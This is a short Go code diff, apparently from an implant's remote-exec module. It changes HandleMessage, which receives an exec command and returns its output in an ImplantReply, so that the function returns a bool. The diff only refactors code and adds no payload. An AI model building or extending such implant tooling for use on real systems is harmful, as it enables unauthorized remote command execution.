@@ -24,10 +24,10 @@ func Create() types.Module {
 	return settings{&state}
 }
 
-func (settings settings) HandleMessage(message *messages.CheckCmdReply, callback func(*messages.ImplantReply)) {
+func (settings settings) HandleMessage(message *messages.CheckCmdReply, callback func(*messages.ImplantReply)) bool {
 	cmd := message.GetExec()
 	if cmd == nil {
-		return
+		return false
 	}
 
 	var out []byte
@@ -45,6 +45,7 @@ func (settings settings) HandleMessage(message *messages.CheckCmdReply, callback
 	}
 
 	callback(&messages.ImplantReply{Module: settings.ID(), Args: out})
+	return true
 }
 
 // Init the state of this module
